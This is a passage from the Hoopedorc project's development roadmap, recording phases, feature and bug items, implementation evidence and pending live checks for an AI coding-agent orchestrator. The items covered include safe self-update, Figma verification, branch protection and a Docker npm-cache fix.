| 9 | A1–A5, U1–U10 | Post-plan audit fixes, then the UX wave from the full-app walkthrough — badge/header/board layout first (U1–U4 are the high-impact ones), trivial polish after. | ✅ done |
| 10 | B20–B24, S7, F20–F26, U11–U14 | Post-UX-wave audit fixes (the Projects-page Pause footgun first), then the remote-deployment QoL wave: docs → routing → approval context → stop-all → update story → polish → WS/PWA. | ✅ done |
| 11 | B25–B27, T1, F27–F35 | Phase 10 audit fixes (all small), then the server test package (T1 — later items lean on it), then the owner's QoL wave: planning context (F27+F28) → standards prompts (F31 → F29 → F30, in that order — F29/F30 build on F31's injection mechanism) → resilience + alerts (F32) → model test (F33) → skills (F34) → quota panel (F35). Tag `v0.3.0` at the end. | ✅ done |
| 12 | B28, U15–U18, F36–F39, F13-P1, B29 | Referential-integrity fix first (B28 — an autonomy footgun), the four small UX items together (U15–U18), then the wave in dependency order: Codex runner (F36) → swappable planner (F37, needs F36's adapter) → AGENTS.md pipeline (F38, planner-produced so it benefits from F37 landing first) → gates sandbox (F13-P1) → EC2 deploy checklist (F39 — the ship gate) → B29 (found live-verifying F36, fixed last). Tagged `v0.4.0`; the owner deploys to EC2 right after. | ✅ done |
| 13 | B30, F40–F43 | Remote-supervision wave, built while the owner's EC2 deploy happens: approval re-arm on restart first (B30 — F40's `/pending` leans on its mechanism), then the Telegram commands (F40), then the three small ones (F41 hold-dispatch option, F43 sandbox UI toggle, F42 bootstrap script) in any order. Tagged `v0.5.0`. F42's live-on-real-EC2 half is still owed (no EC2 box/Docker daemon available in this environment). | ✅ done |
| 14 | B31–B33, S8, F44–F47 | Autonomy-hardening wave from the owner's first real dogfooding runs: B31+F46+F47 first (one PR — all in `planner.ts`; B31 unblocks planning outright and F45 depends on it), then B32 (the autonomous-stall fix), then S8 (destructive-change rail — before more autonomous runs happen), then B33, F44, F45 in any order. Tag `v0.6.0` at the end. | ✅ done |
| 15 | B34–B41, S9–S10, F48–F49, T2, U19 | Reliability/portability/mobile wave from the v0.6.0 Codex audit and owner decisions: execution ownership → process cancellation → fail-closed safety → rollback PR → credential boundary → live settings/effort → portable setup/cache → durability/accounting → shutdown/Telegram → web tests → responsive UX. Final owner Telegram and real-phone checks passed 2026-07-23. | ✅ done |
| 16 | D1, F50 | Make the established contribution workflow cheap to load, then add a fixed-command, fail-closed EC2 update path that survives the serving unit's restart. | implementation complete; live EC2 smoke pending |
| 17 | F51, F52, B42, F53 | Focused context/Figma wave: lean task references and current runner skill facts → exact Figma-node planning verification → recoverable capability blocks → automatic visual-fidelity QA through the existing DAG/gate/validator pipeline. Full spec: `docs/HOOPEDORC_CONTEXT_INTAKE_UPGRADE.md`. | implementation complete; owner-supplied live EC2/Figma/browser acceptance pending |

Each phase = one or a few PRs. Keep PRs scoped to items; reference the item IDs
(S1, B4, F3…) in commit messages so the audit trail maps back to this plan.

Phases 1–15 are **done** — Phases 1–6 tagged `v0.1.0`, Phases
7–8 plus the post-plan audit fixes tagged `v0.2.0` (package.json's own
`version` field, previously stale at `0.1.0`, was corrected to match as
part of F24), Phase 9 (A1–A5, U1–U10) closed out Parts 1–4, Phase 10
(B20–B24, S7, F20–F26, U11–U14) closed out Part 5, Phase 11 (B25–B27, T1,
F27–F35) closed out Part 6 tagged `v0.3.0`, Phase 12 (B28, U15–U18,
F36–F39, F13-P1, B29) closed out Part 7 tagged `v0.4.0` — audited by
Fable 2026-07-09, no defects found — and Phase 13 (B30, F40–F43) closed
out Part 8, tagged `v0.5.0`, Phase 14 (B31–B33, S8, F44–F47) closed
out Part 9, tagged `v0.6.0`, and Phase 15 (B34–B41, S9–S10, F48–F49,
T2, U19) closed Part 10 after the owner reported its final Telegram and
real-phone deployment checks passed on 2026-07-23. F13's phase 1
(gates-only sandbox) shipped
in Part 7; phases 2–3 (agents in the sandbox) remain the headline
candidate for the next wave, per docs/specs/sandbox.md. **F42's live
half is still owed**: verified shellcheck-clean and via `--dry-run`
locally, but no real EC2 instance or Docker daemon was available in this
environment — the owner should run `deploy/ec2-bootstrap.sh` for real
during the actual EC2 deploy and confirm it against this doc's F42
acceptance criteria. **Two Part 9 live-acceptance lines are also still
owed** for the same reason (no real EC2 box/model credentials to
exercise the full autonomous pipeline in this environment): B32's tiny-
real-quota-survives-a-real-run check, and S8's deliberately-destructive-
task-held-for-approval-under-fully_autonomous check — both items'
underlying logic is otherwise fully verified (real git plumbing, real
CLIs, real unit/integration tests; see each item's own done-note above).
Fable independently re-verifies each wave after merge; verification
evidence is in each item's PR description and in this doc's Progress
section above. F13 phases 2–3 remain deferred until a separate design can
isolate agents without breaking same-user CLI OAuth/keychain access or the
Mac/Xcode execution model. Phase 16's D1/F50 implementation is complete; the
owner's first update from the deployed Setup page remains the required live
systemd/Tailscale acceptance check.

### Phase 16 — Part 11: contributor workflow and remote self-update — IMPLEMENTED; LIVE EC2 ACCEPTANCE PENDING

| Item | Status | PR |
|---|---|---|
| D1 — concise repository contributor guide | ✅ done | [#155](https://github.com/IngeniousArtist/hoopedorc/pull/155) |
| F50 — safe UI-triggered update and restart | implemented; owner EC2 smoke pending | [#155](https://github.com/IngeniousArtist/hoopedorc/pull/155) |

The owner requested this wave on 2026-07-16 after the first EC2 dogfooding
cycle. It follows the same branch → scoped implementation → full verification →
PR → green CI → merge workflow as the earlier waves.

---

## Part 11 — Contributor workflow and remote self-update

### D1. Concise repository contributor guide

**Problem:** The repository's working rules, package boundaries, invariants,
and verification expectations are present across the large product plan and
several focused docs. A new coding session can miss the established workflow
or waste context rereading the whole historical roadmap.

**Implementation:**

- Add a root `AGENTS.md` that is the concise day-to-day source of truth for
  branch/PR workflow, architecture boundaries, contract/persistence checklists,
  Git/runtime invariants, UI/deployment expectations, and required gates.
- Keep `docs/PRODUCTIZATION_PLAN.md` as the item-specification and evidence
  archive rather than duplicating its history.
- Add the minimal `CLAUDE.md` bridge so Claude Code reads the same canonical
  guide instead of maintaining a divergent second copy.

**Acceptance:**

- A future agent can identify the correct package, contract update path,
  verification commands, and branch/PR sequence from `AGENTS.md` alone.
- The guide explicitly protects planning durability, unrelated worktree
  changes, scheduler/process ownership, fail-closed gates, sanitized agent
  environments, graceful shutdown, and deployment update safety.
- `CLAUDE.md` points to `AGENTS.md`; there is one maintained workflow source.

### F50. Safe UI-triggered update and restart

**Problem:** The remote Tailscale-served EC2 deployment already has a guarded
`scripts/update.sh`, but the owner must SSH into the box to run it. A naive
server child process would be killed by `hoopedorc.service`'s
`KillMode=control-group` during restart, potentially leaving a half-updated
deployment.

**Implementation:**

- Extend `scripts/update.sh` with a non-interactive mode and machine-readable
  status updates while preserving the manual workflow.
- Add typed GET/POST setup endpoints for update capability/status and starting
  an update. The POST accepts no command, branch, path, or unit arguments.
- Before launch, refuse mock/non-Linux/non-systemd deployments, a
  `hoopedorc.service` whose exact `WorkingDirectory` is not this checkout,
  non-`main` or dirty Git state, active project runs, missing passwordless
  systemd launch capability, and a concurrent update.
- Launch the fixed update script as the service user in a separate transient
  systemd service. It must therefore survive the main service's graceful
  restart without escaping the existing same-user filesystem/CLI boundary.
- Keep `git pull --ff-only`; never stash, reset, merge, force-push, or absorb
  unrelated changes. The script repeats the active-run and repository checks
  to close the request-to-launch race.
- Add a Setup & Health card with availability explanation, current/last status,
  inline confirmation, progress polling, duplicate-submit prevention, and
  actionable failure text.
- Document the EC2/systemd requirement and manual fallback.

**Acceptance:**

- On the supported EC2 deployment, one confirmed UI action performs the same
  guarded pull/install/build flow as `npm run update`, gracefully restarts the
  exact serving unit, and the Tailscale URL becomes healthy again.
- The updater remains alive while `hoopedorc.service` stops and restarts.
- Dirty trees, non-main branches, active projects, mismatched units, unsupported
  hosts, unavailable non-interactive privilege, and concurrent requests are
  refused before Git or dependency state changes.
- A pull/install/build/restart failure remains visible after reconnect with a
  journal hint; a successful restart is recognizable after the new server
  boots.
- Shared types, `ROUTES`, contract docs, server policy tests, web interaction
  tests, mock behavior, responsive browser checks, and the full repository gate
  are updated and green.

**Implementation evidence (2026-07-16):** `AGENTS.md` is now the canonical
day-to-day workflow and `CLAUDE.md` imports it instead of duplicating policy.
The Setup & Health page exposes one fixed update action backed by typed
GET/POST routes. The server refuses unsupported hosts, mismatched systemd
working directories, dirty/non-main checkouts, active projects, missing
passwordless transient-unit capability, Settings-only API tokens, and
concurrent launches. It then starts the repository-owned updater as the service
user in a separate transient systemd unit. `scripts/update.sh` repeats the
fail-closed checks, writes atomic durable status, uses `git pull --ff-only`,
installs with `npm ci`, builds, and restarts only `hoopedorc.service`.

The full local gate passes: typecheck, production build, lint, ShellCheck,
160 engine tests, 12 adapter tests, 173 server tests, 20 web interaction tests,
and 14 Playwright tests across 360/390/768/1280/1440 widths. Desktop and phone
browser inspection found no document overflow or console errors. This
environment is macOS and has no real `hoopedorc.service`, so the acceptance
line proving the detached updater survives an actual EC2 restart and returns
healthy through Tailscale remains intentionally assigned to the owner after
deployment.

---

### Phase 17 — Part 12: focused context handoff and Figma fidelity — IMPLEMENTATION COMPLETE; LIVE ACCEPTANCE PENDING

| Item | Status | PR |
|---|---|---|
| F51 — lean task references and runner-accurate skills | ✅ done; merged and independently verified 2026-07-23 | [#157](https://github.com/IngeniousArtist/hoopedorc/pull/157) |
| F52 — direct Figma nodes and planning verification | ✅ done; merged and independently verified 2026-07-23 | [#158](https://github.com/IngeniousArtist/hoopedorc/pull/158) |
| B42 — recoverable Figma capability blocks | ✅ done; merged and independently verified 2026-07-23 | [#159](https://github.com/IngeniousArtist/hoopedorc/pull/159) |
| F53 — automatic visual-fidelity QA task | ✅ done; merged and independently verified 2026-07-23 | [#160](https://github.com/IngeniousArtist/hoopedorc/pull/160) |

The owner approved this focused wave on 2026-07-23 after the original context
proposal was compared with the merged code and found to overstate the missing
architecture. The complete implementation brief, exact owner decisions,
failure/resume contract, non-goals, per-item acceptance criteria, tests, and
live checks are in `docs/HOOPEDORC_CONTEXT_INTAKE_UPGRADE.md`.

No implementation is part of the planning PR that introduces this roadmap.
Each item follows the normal clean-main → scoped branch → focused checks → full
repository gate → pushed PR → green CI → diff/check review → merge →
independent merged verification workflow before the next item starts.

---

## Part 12 — Focused context handoff and Figma fidelity

### Decisions and scope

Hoopedorc already has interactive dashboard planning, repository inspection,
attachments, archived sessions, durable PRD/AGENTS commits, editable flat task
DAGs, project skill hints, restart-safe scheduling, objective gates,
independent validation, bounded retry/fallback, notifications, and exact
model-call accounting. Part 12 extends those paths rather than creating a
parallel context platform.

Approved behavior:

- The owner pastes one exact Figma selection/node URL per canonical
  screen/state into planning chat.
- A selected top-level frame is an enforceable fidelity source; a whole
  file/page link without a node remains discovery context and prompts for the
  canonical frames.
- Codex, Claude Code, and OpenCode remain available in existing selectors.
  Figma eligibility is proven against the selected runner's real configured
  MCP boundary, never inferred from runner name.
- A preflight failure explains the model, runner, node, problem, and available
  repair actions; it preserves state and consumes no author attempt.
- Fixing MCP, rerouting a model, or using an uploaded screenshot lets the owner
  resume the same plan/task without recreating prior work.
- Unrelated ready work continues while one Figma-dependent task is blocked.
- At least one verified screen node adds one automatic visual-QA draft task by
  default. It compares/repairs through the normal author → gate → independent
  validator → merge path.
- No-Figma projects remain unchanged and make no design probe.

Explicitly rejected for this wave: a `.agent/` memory hierarchy, automatic
long-term memory, global skill/capability registries, a dashboard skill
marketplace, project profiles, generic context-source adapters, a Figma
compiler/cache, per-screen Markdown packages, design sync, raw pixel-diff
gating, a generic Critic role, or a second orchestration lifecycle.

### F51. Lean task references and runner-accurate skills

**Status (2026-07-23):** implemented and locally verified on
`f51-lean-task-references` ([#157](https://github.com/IngeniousArtist/hoopedorc/pull/157)).
The deconstructor now produces self-contained task descriptions with optional
exact `Relevant references` and `Required skills/capabilities` sections. A
shared conditional helper tells both author and validator to inspect them while
returning an empty string for ordinary legacy descriptions. The runner
documentation now reflects installed Claude Code, Codex, and OpenCode skill
behavior and keeps skills separate from MCP configuration. No
Task/API/SQLite context field was added.

Local verification passed: typecheck, build, lint, 164 engine tests, 12 adapter
tests, 175 server tests, 20 web tests, 14 Playwright tests, and
`git diff --check`.

**Problem:** task descriptions are not required to identify the exact PRD
heading, attachment, repository spec, or design source an author and validator
must consult. F34's historical documentation also incorrectly describes skills
as Claude-Code-only and OpenCode as having no skill mechanism.

**Implementation:** establish small `Relevant references` and `Required
skills/capabilities` subsections inside applicable task descriptions. Require
self-contained tasks, name only operator-approved skills, and tell both author
and validator to inspect those pointers. Keep `ProjectConfig.skillHints` as the
project-wide baseline and do not add a Task/API/SQLite context schema. Correct
the runner docs against actual installed CLI behavior while keeping skill
installation separate from MCP configuration/authentication.

**Acceptance:** relevant file/heading/attachment pointers reach author and
validator; absent references add no prompt noise; well-formed existing plan
output remains compatible; no-Figma behavior is unchanged; skill docs
accurately cover Claude Code, Codex, and OpenCode without claiming identical
discovery semantics.

### F52. Direct Figma nodes and planning verification

**Status (2026-07-23):** merged and independently verified as
`52a935f` through
[#158](https://github.com/IngeniousArtist/hoopedorc/pull/158). The
implementation keeps
exact-node intake in the existing planning chat/deconstruction path, adds one
nullable planning-session JSON field, and does not add a task field, generic
capability registry, raw Figma cache, or parallel orchestration path.

Exact user-supplied `design`/`file`/`proto` node URLs are allowlisted,
canonicalized, deduplicated, and bounded. The routed real Claude Code, Codex,
or OpenCode CLI receives a fixed live-node probe through its sanitized
environment; the result is accounted as a bounded `health` invocation and
must return one-to-one real node metadata. Verified refs survive browser
reload and failed deconstruction, but rerouting or restarting the server
forces a fresh capability probe. Typed 409 failures preserve all planning
scratch and explain the stage/model/runner/node and recovery actions.
PlanView supports same-session retry or an explicit attachment-only fallback
that cannot pass unverified live-node claims to later execution.

Local verification passed: typecheck, production build, lint, 164 engine
tests, 12 adapter tests, 190 server tests, 23 web interaction tests, 15
Playwright tests, and `git diff --check`. Playwright covered typed
failure/draft retention/retry and verified-card behavior across
360/390/768/1280/1440 widths; focused real-browser inspection found no
document overflow or console errors on the desktop and phone Plan views.
The same complete gate passed again from merged `main`.

The deployment check that opens an owner-supplied real Figma frame through
the EC2 Codex configuration remains outstanding because no owner Figma node
or deployment MCP configuration was supplied during this item. Claude Code
and OpenCode live checks remain conditional on their Figma MCP setup, as
approved below. These are recorded live-environment checks, not substituted
with mocks.

**Problem:** a Figma link in planning chat is currently unstructured text.
Hoopedorc cannot distinguish an exact screen frame from a whole file, prove the
selected planner/deconstructor can read it, restore a verified reference list
after reload, or guarantee the correct nodes reach draft tasks.

**Implementation:** recognize bounded allowlisted Figma selection URLs, require
a node id for canonical fidelity, canonicalize the stored link, and invoke the
actual selected CLI/MCP boundary to inspect it. Return and persist only a small
planning-session record (node id, real frame name, available viewport/file
metadata, verification model/time), show verified or actionable error state in
PlanView, and map relevant nodes into task descriptions/criteria. Whole
file/page links stay conversational context. Preserve the full planning scratch
on every failure and clear the verified scratch only through the existing
durable plan-commit transaction.

**Acceptance:** exact frame links verify against real identities; file/page
links do not silently become fidelity acceptance; auth/MCP/file/node/timeout/
malformed-output failures are actionable and secret-safe; reroute/fix/retry
uses the same session without duplicate tasks, commits, archives, or costs;
reload restores references; no-Figma planning makes no probe.

### B42. Recoverable Figma capability blocks

**Status (2026-07-23):** implemented and locally verified on
`b42-recoverable-figma-blocks`
([#159](https://github.com/IngeniousArtist/hoopedorc/pull/159)); review is in
progress. Execution now reuses F52's exact-node parser and bounded real-runner
verifier before worktree creation. One representative node per file is checked
through the assigned author model, with project/task `health` accounting and a
positive cache limited to that orchestrator runtime, runner/model
configuration, and file.

Failed preflight blocks only the affected task with durable actionable
context, consumes no attempt, creates no execution artifacts, leaves unrelated
scheduling active, and causes the project to end paused. A stable mid-author
marker is normalized to a failed run and stops before commit/gates/validator.
Existing blocked-task reassignment and Retry remain the only resume path;
remote state is cleaned best-effort when a later fallback/mid-author block
would otherwise collide with Retry. Web/Telegram capability alerts use a
secret-free persisted key and deduplicate across runtimes/restarts.

The full local gate passes: typecheck, production build, lint, 170 engine
tests, 12 adapter tests, 196 server tests, 23 web interaction tests, 15
Playwright tests across 360/390/768/1280/1440 widths, and
`git diff --check`. Playwright's local Vite/mock-server bind required the
approved unsandboxed test command after the filesystem/process sandbox
returned `EPERM`; all 15 browser tests then passed.

The owner/deployment live check remains outstanding: on a scratch project,
disable or misconfigure the assigned model's real Figma MCP, observe the
zero-attempt block and one alert, restore access or reassign the model, Retry,
and confirm the same task proceeds. No owner Figma node plus EC2 runner
configuration was available during local implementation.

**Problem:** losing Figma access before or during an author call would currently
look like an ordinary model/no-changes failure, waste attempts, and potentially
stop the wrong amount of work.

**Implementation:** before a Figma-dependent author attempt, probe the actual
assigned model against a representative referenced node using the normal
sanitized runner environment. A failure happens before attempt/worktree/PR
creation, blocks only that task with actionable `statusReason`, creates one
deduplicated web/Telegram notification, and leaves unrelated scheduling active.
Recognize a stable capability-unavailable marker if MCP disappears after
preflight. Reuse existing model reassignment and Retry to resume; short-lived
positive results are reused only inside the current orchestrator runtime,
keyed by logical model, runner/model configuration, and Figma file. Probe one
representative exact node per distinct file; a new runtime, server restart,
model reassignment, runner configuration change, or different file must prove
access again. Record every actual probe through the existing model-invocation
ledger as a `health` call associated with the project and task. This remains a
Figma-specific execution guard, not a generic capability platform.

**Acceptance:** failed preflight leaves attempts unchanged and creates no
worktree, branch, commit, PR, gate, or validator call; independent tasks
continue; fix + Retry and reroute + Retry resume the same task; restart
preserves the block explanation without consuming an attempt; a Figma block
leaves the project paused rather than falsely complete; mid-call loss is
recorded as a failed author run and is not misreported as “no changes”;
notifications are durably deduplicated across restarts and redact raw runner
errors; no-Figma tasks bypass the hook and make no extra model call.

### F53. Automatic visual-fidelity QA task

**Status (2026-07-23):** done; merged through
[#160](https://github.com/IngeniousArtist/hoopedorc/pull/160) as `45e3ebb`
after green CI, then independently verified on merged `main`. Both the branch
and merged-commit full gates passed: typecheck, build, lint, 171 engine tests,
12 adapter tests, 202 server tests, 25 web tests, 16 Playwright scenarios
across 360, 390, 768, 1280, and 1440px, and `git diff --check`. Playwright
required the approved unsandboxed command after the managed sandbox refused
the local mock/Vite listener with `EPERM`; the tests themselves passed. The
owner-supplied live plan → autorun → visual-QA check on a scratch UI and EC2
runner remains outstanding because no real owner desktop/mobile frames,
scratch UI, or EC2 configuration were supplied in this environment.

**Problem:** the current validator reviews acceptance and the code diff but does
not guarantee a browser-based comparison with supplied Figma screens.

**Implementation:** use a pure server helper analogous to `ensureDocsTask` to
insert exactly one visible/editable visual-QA draft task when verified nodes
exist. It depends on all non-doc implementation tasks; the standing docs task
remains last. Assign a verified Figma-capable frontend model, include every
screen/state/viewport plus route/fixture/auth/startup context, and have the
author run the real app, capture the supplied viewports, compare material
layout/typography/spacing/color/component/state behavior, repair discrepancies,
and continue through normal gates and independent validation. Removing the
visible draft task is the explicit opt-out; commit does not silently re-add it.

The bounded verified-node record has identity and dimensions but no invented
route/fixture schema, so the helper copies that context from the existing
self-contained implementation handoffs. It prefers the still-enabled model
that performed live verification only when that preserves an independent
validator, otherwise normal frontend routing; B42 re-proves whichever model
the owner leaves selected before execution. Figma capability loss uses B42.
Browser/startup failure stays an explicit normal author/gate failure and Retry
rather than expanding B42 into a generic capability platform.

**Acceptance:** verified nodes create exactly one idempotent QA task and
no-Figma plans create none; dependencies and docs ordering are correct;
desktop/mobile/state references remain distinct; a missing mobile design is
not presented as mobile fidelity; Figma failure blocks and resumes via B42;
browser/startup failure is visible and retryable without a false comparison
claim; the task repairs a real scratch UI against owner-supplied frames and
merges through the existing pipeline; no Critic loop or alternate merge path
is introduced.

### Phase 17 execution order

1. F51 — small prompt/documentation foundation, no contract migration.
2. F52 — typed planning contract + minimal planning-session persistence + UI.
3. B42 — scheduler/runtime refusal and resume behavior using F52 references.
4. F53 — automatic visual-QA draft task built on verified references and B42.
5. Final live EC2/Figma/browser acceptance and roadmap evidence update.

### B43. First-project bootstrap and subscription-safe GLM defaults — HIGH

**Status (2026-07-24):** implemented and locally verified on
`fix/npm12-bootstrap-zai` ([#163](https://github.com/IngeniousArtist/hoopedorc/pull/163)).

**Confirmed problems:** the first live blackjack scaffold stopped before its
first author attempt because Hoopedorc's dependency setup required a lockfile
for the intentionally dependency-free seed `package.json`; successful npm 12
gate notices were written to stderr and discarded from gate details; and the
default GLM slug used the general `zai/` provider even when the operator had a
Z.AI Coding Plan subscription, which uses a distinct endpoint and provider.
The local browser gate also reused an unrelated Vite server and proxied its E2E
requests into the token-protected production service.

**Fix:** allow only a dependency-free, package-manager-free Node seed to pass
setup without an install. Any dependency in any workspace manifest, or an
explicit `packageManager`, retains B38's reproducible-lock requirement. Preserve
non-empty stdout and stderr from successful gate commands. Move the default GLM
model and catalog discovery to `zai-coding-plan/glm-5.2`, while continuing to
show general `zai/` models for operators who intentionally use that provider;
document the Coding Plan endpoint and billing boundary. Give Playwright
dedicated strict web/API ports and an in-memory mock database, with no reuse of
an arbitrary already-running server.

**Acceptance:** a real empty seed reaches author dispatch without setup work;
root or workspace dependencies without a lock still fail actionably; an
explicit manager without its lock still fails; successful gate stderr appears
in persisted details; the installed OpenCode catalog confirms the exact GLM
slug; model-catalog/server and affected web tests pass; all repository gates
remain green. After merge and deployment, Retry resumes the existing failed
blackjack scaffold without replacing its project or task plan. E2E remains
isolated while the live service and a developer Vite process are both running.

**Verification evidence (2026-07-24):** the production SQLite record confirmed
the persisted blackjack seed has no dependencies and failed setup with zero
author attempts. `opencode models zai-coding-plan` listed
`zai-coding-plan/glm-5.2`. The complete local gate passed: typecheck,
production build, lint, 12/12 adapter tests, 173/173 engine tests, 203/203
server tests, 25/25 web Vitest interactions, 16/16 Playwright scenarios across
360, 390, 768, 1280, and 1440px, and `git diff --check`. The first browser run
reproduced the test-server collision against the production token dialog; the
isolated-port rerun passed while `hoopedorc.service` remained active and the
unrelated Vite process remained on its original port. One unrelated SetupView
unit assertion transiently missed its async readiness on a parallel full-suite
run; its focused rerun and the following full 25-test web rerun both passed.
Post-deployment Retry of the preserved failed task remains the required live
acceptance check after merge.

## Part 13 — Production-boundary and audit-integrity remediation (2026-07-24 incident audit)

### Phase 18 status and operating rules

**Status (2026-07-24):** diagnosis complete; implementation not started. This
wave preserves the historical B42/F53/B43 evidence above and records the
follow-up work discovered while investigating the live blackjack project.
`hoopedorc.service` is active, but the project is paused: its scaffold task
merged, then three dependency-bearing tasks failed together before an author
attempt with the same Docker/npm setup error. No task was retried and no
project data, worktree, dependency cache, source file, or operator change was
deleted during the audit.

The repository workflow is part of the remediation, not optional ceremony:

1. Merge this roadmap addition as a documentation-only PR after green CI.
2. Complete D2 before merging another runtime change. Start every item from a
   clean, current `main`, use one named branch and one reviewable PR, wait for
   the required check, inspect the final diff, then merge.
3. Implement B44 alone and deploy it before retrying any of the three failed
   blackjack tasks. Prove one preserved task crosses dependency setup before
   resuming the rest.
4. Continue in the order below. Do not combine unrelated items to save a PR.
   A later item starts only after the prior merged commit and its required live
   boundary have been independently verified.
5. Every PR records focused regression evidence plus the complete repository
   gate. Mock tests do not replace the specified systemd, Docker, GitHub,
   installed-CLI, or real-Figma checks.
6. Preserve persisted settings, planning drafts, task/run history, dirty
   project files, branches, and untracked operator content. No reset, stash,
   force-push, broad cleanup, task replacement, or deletion is authorized by
   this plan.

| Order | Item | Phase | Proposed branch / PR boundary | Status |
|---|---|---|---|---|
| 1 | D2 — protected-main and merge-evidence guardrails | 18A | `chore/protect-main-workflow` plus the explicit GitHub setting change | implemented; [#165](https://github.com/IngeniousArtist/hoopedorc/pull/165) |
| 2 | B44 — Docker-safe package-manager environment | 18B | `fix/docker-npm-cache-boundary` | implemented; [#166](https://github.com/IngeniousArtist/hoopedorc/pull/166) |
| 3 | B45 — persisted Coding Plan default migration | 18C | `fix/persisted-glm-provider-migration` | implemented; [#168](https://github.com/IngeniousArtist/hoopedorc/pull/168) |
| 4 | B46 — fail-closed Figma preflight and cache invalidation | 18D | `fix/figma-preflight-integrity` | implemented and deployed; [#170](https://github.com/IngeniousArtist/hoopedorc/pull/170). Live acceptance deferred indefinitely (owner choice, 2026-07-24) — no owner-supplied Figma input |
| 5 | B47 — collision-safe, viewport-correct visual QA generation | 18D | `fix/visual-qa-task-generation` | implemented and deployed; [#172](https://github.com/IngeniousArtist/hoopedorc/pull/172). Live acceptance deferred indefinitely (owner choice, 2026-07-24) |
| 6 | B48 — validator empty-reasons audit correctness | 18E | `fix/validator-empty-reasons` | implemented, deployed, live-verified; [#174](https://github.com/IngeniousArtist/hoopedorc/pull/174) |
| 7 | Phase 18 final acceptance and evidence | 18E | documentation-only evidence PR if earlier PRs cannot record every live check | done — see closing note after the Phase 18 PR and verification order below |

### D2. Protected-main and merge-evidence guardrails — HIGH (workflow)

**Status (2026-07-24):** implemented through
[#165](https://github.com/IngeniousArtist/hoopedorc/pull/165). `main` now
requires a current pull request with the exact `build-and-test` check, applies
the rule to administrators, and rejects force-pushes and branch deletion. The
repository-owned PR template records the roadmap item, focused and full gate,
live/deferred evidence, and data-handling considerations.

**Acceptance evidence (2026-07-24):** GitHub's protection API read-back
reported `strict: true`, required context `build-and-test`, administrator
enforcement, zero required approvals, and disabled force-push/deletion. This
PR was `BLOCKED` while its required check was in progress and became clean only
after that check passed. The complete local gate passed: typecheck, build,
lint, 173 engine tests, 12 adapter tests, 203 server tests, 25 web tests, 16
Playwright scenarios, and `git diff --check`.

**Confirmed problem:** `main` currently has no GitHub branch protection. PR
[#162](https://github.com/IngeniousArtist/hoopedorc/pull/162) merged at
09:02:46 UTC while its only `build-and-test` check was still running; that
check did not complete successfully until 09:05:14 UTC. Its change later
passed, but the merge violated the repository's branch → PR → green checks →
merge invariant and showed that documentation alone does not enforce it.

**Implementation:** configure GitHub to require a pull request and the exact
`build-and-test` status check from `.github/workflows/ci.yml` before `main` can
advance. Require the branch to be current with `main`, prevent the normal
administrator/bypass path from silently skipping the rule, and keep force
pushes and branch deletion disabled. Add a small repository-owned PR template
or equivalent review checklist only if it materially records the roadmap ID,
focused tests, full gate, live checks, and deferred evidence without duplicating
`AGENTS.md`. Keep the version-controlled workflow and GitHub rule names aligned.

**Likely files/settings:** GitHub branch protection or ruleset for `main`,
`.github/workflows/ci.yml` only if the stable check name needs clarification,
an optional `.github/pull_request_template.md`, `AGENTS.md`, and this roadmap.
Do not add a second CI workflow or weaken the existing full test job.

**Acceptance:** the GitHub API reports `main` protected; a scratch PR with
`build-and-test` pending or failing cannot merge through the normal or
administrator path; the same PR becomes mergeable after the required current
head commit passes; a direct non-fast-forward/force push remains refused. The
PR description names its roadmap item, focused/full verification, deployment
checks, and anything still pending. Record screenshots or API output without
tokens or repository secrets.

### B44. Docker-safe package-manager environment — BLOCKER

**Status (2026-07-24):** implemented through
[#166](https://github.com/IngeniousArtist/hoopedorc/pull/166) and deployed as
`8d5317a`. The sandbox now replaces inherited host npm cache configuration
with its container-local `/tmp/.npm` cache. It preserves safe registry/proxy
configuration; a bounded regular PEM bundle configured through `cafile` or
`NODE_EXTRA_CA_CERTS` crosses only as one fixed read-only mount. Host agent
environment behavior remains unchanged.

**Acceptance evidence (2026-07-24):** the focused regression proved
`NPM_CONFIG_CACHE=/home/ubuntu/.npm` cannot reach Docker, certificate bundles
are rewritten to fixed internal mount paths, and missing/device paths plus
credentials remain absent. A real locked `is-number@7.0.0` fixture completed
`npm ci --ignore-scripts` through the actual sandbox function with the service
UID and host cache value; materialized `node_modules` was owned by `1000:1000`.
The full local gate passed: typecheck, build, lint, 174 engine tests, 12
adapter tests, 203 server tests, 25 web tests, 16 Playwright scenarios, and
`git diff --check`. Protected-main CI passed on the final PR head.

The production update ran through `scripts/update.sh --non-interactive
--require-main --require-systemd-restart` while blackjack was paused. The
restarted systemd-owned Node process still inherited
`npm_config_cache=/home/ubuntu/.npm`, proving the real service boundary, then
Retry of the preserved rules-engine task crossed dependency setup and began
author attempt 1 without replacing the project or task plan. Its worktree and
published dependency cache are owned by `1000:1000`; the service remains
active. The project stays paused and its other two failed tasks remain
untouched while the verified author attempt runs.

**Confirmed problem:** production starts the server through npm, which supplies
`npm_config_cache=/home/ubuntu/.npm`. `safeNpmConfigEnv` forwards `cache`, and
the Docker gate/setup sandbox copies that host-only absolute path even though
it mounts only the worktree and sets its own container home. The container
runs as the host UID and cannot create `/home/ubuntu`, so the first shared
frozen install exits with `EACCES`. Three tasks with the same dependency
fingerprint correctly awaited that one failed installation and all stopped
with `attempts = 0`; this was not a model failure or three concurrent `npm ci`
races.

**Implementation:** establish an explicit container-local package-manager
environment at the sandbox ownership boundary. Host npm routing behavior that
is safe and meaningful inside the container may remain allowlisted, but
host-only path values such as the npm cache must be omitted, translated to a
writable container path, or mounted through an intentional least-privilege
contract. Audit the other path-bearing npm settings, especially `cafile`,
rather than fixing only the observed string. Preserve B38's frozen-lock,
fingerprint, single-publisher, atomic-cache, host-UID ownership, cancellation,
and failure-cleanup guarantees.

**Likely files:** `packages/adapters/src/env.ts`,
`packages/engine/src/sandbox.ts`, their focused tests,
`packages/engine/src/worktree-manager.test.ts`,
`docs/specs/sandbox.md`, `docs/USER_GUIDE.md`, and this roadmap.
`deploy/hoopedorc.service` changes only if the owning-layer fix proves that the
service contract itself is wrong.

**Non-goals:** do not run task containers as root, mount the operator's whole
home directory, expose npm credentials, switch production away from prebuilt
startup merely to hide the inherited setting, relax frozen installs, clear
the host npm cache, or replace the existing failed tasks/project.

**Acceptance:** first add a regression that launches setup with
`npm_config_cache=/home/ubuntu/.npm` and proves Docker receives no unusable
host path. A real minimal locked Node repository must complete frozen install
inside the same Docker image as the service UID, with a writable container
home/cache and host-owned materialized artifacts. Registry/proxy and approved
certificate behavior still work; credential-bearing npm settings remain
absent. Concurrent identical fingerprints still perform one publish,
different fingerprints remain independent, cancellation settles, a failed
install publishes no cache, and retry succeeds after the environmental cause
is removed.

